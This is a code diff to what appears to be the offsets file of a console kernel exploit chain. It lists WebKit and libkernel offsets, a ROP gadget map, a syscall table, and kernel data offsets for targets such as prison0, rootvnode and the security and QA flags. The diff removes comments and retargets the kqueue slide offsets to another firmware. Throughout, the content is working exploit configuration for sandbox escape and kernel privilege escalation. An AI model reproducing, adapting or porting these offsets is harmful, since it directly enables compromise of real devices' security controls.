@@ -1,50 +1,48 @@
-const OFFSET_wk_vtable_first_element     = 0x00D04580; //same
-const OFFSET_wk_memset_import            = 0x028F9D38; //same
-const OFFSET_wk___stack_chk_guard_import = 0x028F9A18; //same
+const OFFSET_wk_vtable_first_element     = 0x00D04580;
+const OFFSET_wk_memset_import            = 0x028F9D38;
+const OFFSET_wk___stack_chk_guard_import = 0x028F9A18;
 
-const OFFSET_lk___stack_chk_guard        = 0x00069190; //same
-const OFFSET_lk_pthread_create_name_np   = 0x00001B60; //same
-const OFFSET_lk_pthread_join             = 0x0002FAD0; //same
-const OFFSET_lk_pthread_exit             = 0x00020A80; //same
-const OFFSET_lk__thread_list             = 0x000601A8; //same
+const OFFSET_lk___stack_chk_guard        = 0x00069190;
+const OFFSET_lk_pthread_create_name_np   = 0x00001B60;
+const OFFSET_lk_pthread_join             = 0x0002FAD0;
+const OFFSET_lk_pthread_exit             = 0x00020A80;
+const OFFSET_lk__thread_list             = 0x000601A8;
 
-const OFFSET_lc_memset                   = 0x000148F0; //same
-const OFFSET_lc_setjmp                   = 0x0005E9B0; //same
-const OFFSET_lc_longjmp                  = 0x0005EA00; //same
+const OFFSET_lc_memset                   = 0x000148F0;
+const OFFSET_lc_setjmp                   = 0x0005E9B0;
+const OFFSET_lc_longjmp                  = 0x0005EA00;
 
-const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88; //??
+const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;
 
 let wk_gadgetmap = {
-    "ret"    : 0x00000042, //C3, same
-    "pop rdi": 0x00043B7C, //5F C3, same
-    "pop rsi": 0x0008F33E, //5E C3, same
-    "pop rdx": 0x000156EA, //5A C3, same
-    "pop rcx": 0x00060DF3, //59 C3, same
-    "pop r8": 0x01262A4F, //41 58 C3, same
-    "pop r9" : 0x004E450C, //47 59 C3, same
-    "pop rax": 0x00084094, //58 C3, same
-    "pop rsp": 0x0005D293, //5C C3, same
+    "ret"    : 0x00000042,
+    "pop rdi": 0x00043B7C,
+    "pop rsi": 0x0008F33E,
+    "pop rdx": 0x000156EA,
+    "pop rcx": 0x00060DF3,
+    "pop r8": 0x01262A4F,
+    "pop r9" : 0x004E450C,
+    "pop rax": 0x00084094,
+    "pop rsp": 0x0005D293,
 
-    "mov [rdi], rsi": 0x00118570,//same
-    "mov [rdi], rax": 0x00C3A5C0,//same
-    "mov [rdi], eax": 0x003FB6E6,//same
+    "mov [rdi], rsi": 0x00118570,
+    "mov [rdi], rax": 0x00C3A5C0,
+    "mov [rdi], eax": 0x003FB6E6,
 
-    "infloop": 0x000109E1, //EB FE same
+    "infloop": 0x000109E1,
 
     //branching specific gadgets
-    "cmp [rcx], eax" : 0x00204122, //39 01 C3 same
-    "sete al"        : 0x00B7B735, //same
-    "seta al"        : 0x000CCFB4, //same
-    "setb al"        : 0x001B7657, //same
-    "setg al"        : 0x000708c9, //same
-    "setl al"        : 0x01517692, //same
-    "shl rax, 3"     : 0x01A43F03, //same
-    "add rax, rdx"   : 0x016F4948, //same
-    "mov rax, [rax]" : 0x0142E309, //same
-    "inc dword [rax]": 0x017629AF, //same
+    "cmp [rcx], eax" : 0x00204122,
+    "sete al"        : 0x00B7B735,
+    "seta al"        : 0x000CCFB4,
+    "setb al"        : 0x001B7657,
+    "setg al"        : 0x000708c9,
+    "setl al"        : 0x01517692,
+    "shl rax, 3"     : 0x01A43F03,
+    "add rax, rdx"   : 0x016F4948,
+    "mov rax, [rax]" : 0x0142E309,
+    "inc dword [rax]": 0x017629AF,
 };
-
-//1-1 match with devkit libkernel syscalls
 
 let syscall_map = {
     0x001: 0x34230, // sys_exit
@@ -376,13 +374,13 @@ let syscall_map = {
     0x2D2: 0x32E00, // sys_workspace_ctrl
 };
 
-const OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD    = 0x8AD3; //same
-const OFFSET_KERNEL_DATA_KQUEUE_BASE_SLIDE  = 0x318AD3; //same
-const OFFSET_KERNEL_TEXT_KQUEUE_BASE_SLIDE  = 0xF18AD3; //same
-const OFFSET_KERNEL_DATA_BASE_ALLPROC       = 0x27EDCB8; //same
-const OFFSET_KERNEL_DATA_BASE_SECURITYFLAGS = 0x6506474; //same
-const OFFSET_KERNEL_DATA_BASE_TARGETID      = 0x650647D; //same
-const OFFSET_KERNEL_DATA_BASE_QA_FLAGS      = 0x6506498; //same
-const OFFSET_KERNEL_DATA_BASE_UTOKEN_FLAGS  = 0x6506500; //same
-const OFFSET_KERNEL_DATA_BASE_PRISON0       = 0x1D34D00; //same
-const OFFSET_KERNEL_DATA_BASE_ROOTVNODE     = 0x66E74C0; //same
+const OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD    = 0x88F7;
+const OFFSET_KERNEL_DATA_KQUEUE_BASE_SLIDE  = 0x3188F7;
+const OFFSET_KERNEL_TEXT_KQUEUE_BASE_SLIDE  = 0xF188F7;
+const OFFSET_KERNEL_DATA_BASE_ALLPROC       = 0x27EDCB8;
+const OFFSET_KERNEL_DATA_BASE_SECURITYFLAGS = 0x6506474;
+const OFFSET_KERNEL_DATA_BASE_TARGETID      = 0x650647D;
+const OFFSET_KERNEL_DATA_BASE_QA_FLAGS      = 0x6506498;
+const OFFSET_KERNEL_DATA_BASE_UTOKEN_FLAGS  = 0x6506500;
+const OFFSET_KERNEL_DATA_BASE_PRISON0       = 0x1D34D00;
+const OFFSET_KERNEL_DATA_BASE_ROOTVNODE     = 0x66E74C0;
